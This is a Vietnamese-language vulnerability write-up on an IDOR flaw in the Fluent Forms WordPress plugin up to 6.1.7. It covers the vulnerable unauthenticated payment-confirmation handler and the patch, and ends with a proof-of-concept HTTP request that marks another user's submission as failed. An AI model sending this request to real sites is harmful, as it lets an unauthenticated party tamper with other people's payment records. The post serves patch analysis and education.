# CVE-2025-13748 Analysis & POC


<!--more-->

## CVE & Basic Info
Plugin **Fluent Forms – Customizable Contact Forms, Survey, Quiz, & Conversational Form Builder** tồn tại **lỗ hổng Insecure Direct Object Reference (IDOR)** trong tất cả các phiên bản **≤ 6.1.7** thông qua tham số `submission_id` trong endpoint xác nhận thanh toán SCA.
Lỗ hổng cho phép **người dùng chưa xác thực** có thể **đánh dấu submission của người khác là failed**, gây gián đoạn quá trình thanh toán.

* **CVE ID**: [CVE-2025-13748](https://www.cve.org/CVERecord?id=CVE-2025-13748)
* **Vulnerability Type**: Insecure Direct Object References (IDOR)
* **Affected Versions**: <= 6.1.7
* **Patched Versions**: 6.1.8
* **CVSS severity**: Low (6.5)
* **Required Privilege**: Unauthenticated
* **Product**: [WordPress FluentForm Plugin](https://wordpress.org/plugins/fluentform/)

## Requirements
* **Local WordPress & Debugging**
    * [Virtual Machine](https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/)
    * [Docker](https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/)
* **Plugin Version** - **FluentForm**:  
    * `6.1.7` – **vulnerable**  
    * `6.1.8` – **patched**
* **Diff Tool (diff)** → [**Meld**](https://meldmerge.org/) hoặc bất kỳ công cụ diff nào.

## Analysis 
Plugin đăng ký AJAX handler **cho người chưa đăng nhập**:

```php {title="StripeInlineProcessor.php v6.1.7" data-open=true hl_lines=[]}
add_action('wp_ajax_nopriv_fluentform_sca_inline_confirm_payment', [$this, 'confirmScaPayment']);
```

`wp_ajax_nopriv_` là hook dành cho người dùng chưa đăng nhập (kể cả Unauthenticated). Khi có request tới endpoint `/wp-admin/admin-ajax.php` với param `action=fluentform_sca_inline_confirm_payment` thì callback `confirmScaPayment` được gọi:

```php {title="StripeInlineProcessor.php v6.1.7" data-open=true hl_lines=[]}
public function confirmScaPayment()
{
    // phpcs:ignore WordPress.Security.NonceVerification.Recommended -- Nonce verified by Stripe webhook signature
    $formId = isset($_REQUEST['form_id']) ? intval($_REQUEST['form_id']) : 0;
    // phpcs:ignore WordPress.Security.NonceVerification.Recommended -- Nonce verified by Stripe webhook signature
    $submissionId = isset($_REQUEST['submission_id']) ? intval($_REQUEST['submission_id']) : 0;
    // phpcs:ignore WordPress.Security.NonceVerification.Recommended -- Nonce verified by Stripe webhook signature
    $paymentMethod = isset($_REQUEST['payment_method']) ? sanitize_text_field(wp_unslash($_REQUEST['payment_method'])) : '';
    // phpcs:ignore WordPress.Security.NonceVerification.Recommended -- Nonce verified by Stripe webhook signature
    $paymentIntentId = isset($_REQUEST['payment_intent_id']) ? sanitize_text_field(wp_unslash($_REQUEST['payment_intent_id'])) : '';

    $this->setSubmissionId($submissionId);
    $submission = $this->getSubmission();
    $this->form = $this->getForm();

    $transaction = $this->getLastTransaction($submissionId);

    $confirmation = SCA::confirmPayment($paymentIntentId, [
        'payment_method' => $paymentMethod
    ], $formId);

    if (is_wp_error($confirmation)) {
        $message = 'Payment has been failed. ' . $confirmation->get_error_message();
        $this->handlePaymentChargeError($message, $submission, $transaction, $confirmation, 'payment_error');
    }

    if ($confirmation->status == 'succeeded') {
        $charge = $confirmation->charges->data[0];;
        $this->handlePaymentSuccess($charge, $transaction, $submission);
    } else {
        $this->handlePaymentChargeError('We could not verify your payment. Please try again', $submission, $transaction, $confirmation, 'payment_error');
    }
}
```

Trong hàm `confirmScaPayment()`, plugin lấy `submission_id` trực tiếp từ request:

```php
$submissionId = isset($_REQUEST['submission_id']) ? intval($_REQUEST['submission_id']) : 0;
```

Giá trị này:

* Không được ràng buộc với user hiện tại
* Không được kiểm tra ownership
* Không được kiểm tra mối quan hệ với `form_id`

Tức là bất kỳ ai gửi request đến endpoint đều có thể chỉ định bất kỳ submission nào tồn tại trong database.

Sau khi lấy `submission_id`, hệ thống tiếp tục:

```php
$this->setSubmissionId($submissionId);
$submission = $this->getSubmission();
```

> [!BUG] Ở đây xảy ra điều cốt lõi của IDOR: Object (submission) được truy xuất trực tiếp bằng ID do user kiểm soát, mà không có bất kỳ lớp kiểm soát truy cập nào.

Không có bất kỳ logic nào như:

```php
if ($submission->user_id !== get_current_user_id()) {
    deny_access();
}
```

Hay:

```php
if ($submission->form_id !== $formId) {
    deny_access();
}
```

Điều này dẫn đến việc: Submission của user A có thể bị thao tác bởi người chưa đăng nhập.

Ở bản vá, toàn bộ request phải vượt qua bước xác thực:

![Patch](patch.png "Bản vá")

```php
protected function validateScaRequest($submissionId, $paymentIntentId, $submission = null, $transaction = null)
{
    $strictMode = apply_filters('fluentform/stripe_sca_strict_security', false);
    $warnings = [];

    // Validate nonce (optional in non-strict mode for backward compatibility)
    $nonce = isset($_REQUEST['_ff_stripe_nonce']) ? sanitize_text_field(wp_unslash($_REQUEST['_ff_stripe_nonce'])) : '';
    
    if ($nonce) {
        $nonceAction = 'fluentform_sca_confirm_' . $submissionId;
        if (!wp_verify_nonce($nonce, $nonceAction)) {
            $error = __('Security verification failed. Invalid nonce.', 'fluentform');
            if ($strictMode) {
                return new \WP_Error('invalid_nonce', $error);
            }
            $warnings[] = 'Invalid nonce provided';
        }
    } else {
        $warning = 'No nonce provided for SCA payment confirmation';
        if ($strictMode) {
            return new \WP_Error('missing_nonce', __('Security verification failed. Nonce required.', 'fluentform'));
        }
        $warnings[] = $warning;
    }

    // Validate submission exists
    if (!$submission || !$submission->id) {
        return new \WP_Error('invalid_submission', __('Invalid submission.', 'fluentform'));
    }


    if ($submission->payment_status === 'paid') {
        return new \WP_Error(
            'already_paid',
            __('This payment has already been completed and cannot be modified.', 'fluentform')
        );
    }

    // stores it in transaction.charge_id, and frontend sends it back.
    // Mismatch only occurs during attack attempts.
    if ($transaction && $transaction->charge_id) {
        if ($transaction->charge_id !== $paymentIntentId) {
            return new \WP_Error(
                'payment_intent_mismatch',
                __('Payment verification failed. Payment intent does not match.', 'fluentform')
            );
        }
    }

    // Log warnings for monitoring
    if (!empty($warnings) && defined('WP_DEBUG') && WP_DEBUG) {
        $logData = [
            'parent_source_id' => $submission->form_id,
            'source_type'      => 'submission_item',
            'source_id'        => $submission->id,
            'component'        => 'Payment',
            'status'           => 'warning',
            'title'            => __('Stripe SCA Security Warning', 'fluentform'),
            'description'      => implode('; ', $warnings)
        ];
        do_action('fluentform/log_data', $logData);
    }

    return [
        'valid'    => true,
        'warnings' => $warnings
    ];
}
```

Hàm `validateScaRequest` thực hiện:

* Kiểm tra `submission_id` có tồn tại hợp lệ hay không
* Ngăn xử lý nếu submission đã được thanh toán
* Ràng buộc `payment_intent_id` với transaction tương ứng
* Ngăn việc dùng payment intent giả mạo
* Thêm xác thực nonce cho request
* Ghi log khi phát hiện hành vi bất thường
* Chặn hoàn toàn việc thay đổi trạng thái submission trái phép

Điều này đã kiểm soát chặt logic, khiến lỗi hổng IDOR không thể xảy ra.

## Flow
{{< mermaid >}}
flowchart TD
A["Unauthenticated Attacker"] 
--> B["Send request to admin-ajax.php?action=fluentform_sca_inline_confirm_payment"]

B --> C["Extract submission_id & payment_intent_id from request"]

C --> D["No nonce validation"]

D --> E["Load submission by submission_id"]

E --> F["No ownership or relationship check"]

F --> G["Load transaction using submission_id"]

G --> H["No validation between payment_intent_id and transaction"]

H --> I["Process payment confirmation"]

I --> J["Update submission status (success / failed)"]

J --> K["Attacker manipulates victim's submission"]
{{< /mermaid >}}


## Proof of Concept (PoC)
Gửi request:

```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: victim.com
Content-Type: application/x-www-form-urlencoded

action=fluentform_sca_inline_confirm_payment
&submission_id=1024
&payment_method=card
&payment_intent_id=pi_fake
```

## Conclusion

Lỗ hổng CVE-2025-13748 xuất phát từ việc **tin tưởng dữ liệu đầu vào do client kiểm soát**, cụ thể là `submission_id`, trong khi không có bất kỳ cơ chế kiểm soát quyền sở hữu hoặc xác thực ngữ cảnh nào. Endpoint xác nhận thanh toán được mở cho người chưa đăng nhập và cho phép thao tác trực tiếp lên submission mà không ràng buộc với user, form hay transaction hợp lệ.

Việc thiếu kiểm tra ownership, thiếu ràng buộc giữa `payment_intent_id` và transaction, cùng với việc không xác thực nguồn request đã tạo điều kiện cho kẻ tấn công **thao túng trạng thái thanh toán của người khác**. Đây là một trường hợp điển hình của **Insecure Direct Object Reference (IDOR)** phát sinh từ lỗi thiết kế logic nghiệp vụ, không phải lỗi kỹ thuật đơn lẻ.

Bản vá đã khắc phục triệt để bằng cách bổ sung nhiều lớp kiểm soát, xác thực và ràng buộc dữ liệu, từ đó loại bỏ hoàn toàn khả năng khai thác.

## Key Takeaways

* Không bao giờ tin dữ liệu do client cung cấp, kể cả trong các luồng nội bộ như thanh toán.
* IDOR thường phát sinh từ **thiếu kiểm soát ownership**, không phải do thiếu xác thực đầu vào.
* Các endpoint `wp_ajax_nopriv_*` cần được kiểm soát chặt chẽ vì chúng mở cho mọi đối tượng truy cập.
* Payment flow phải ràng buộc chặt chẽ giữa **submission – transaction – payment intent**.
* Cần xác thực cả **nguồn request** lẫn **ngữ cảnh nghiệp vụ**, không chỉ dữ liệu.
* Defense-in-depth (nhiều lớp kiểm soát) là cách duy nhất để ngăn IDOR hiệu quả.

## References
[IDOR](https://book.hacktricks.wiki/en/pentesting-web/idor.html)

[WordPress FluentForm Plugin <= 6.1.7 is vulnerable to Insecure Direct Object References (IDOR)](https://patchstack.com/database/wordpress/plugin/fluentform/vulnerability/wordpress-fluent-forms-plugin-6-1-7-unauthenticated-insecure-direct-object-reference-to-payment-status-tampering-via-submission-id-vulnerability)

---

> Tác giả: [Bui Van Y](github.com/w41bu1)  
> URL: http://localhost:1313/vi/posts/2025-12-27-cve-2025-13748/  

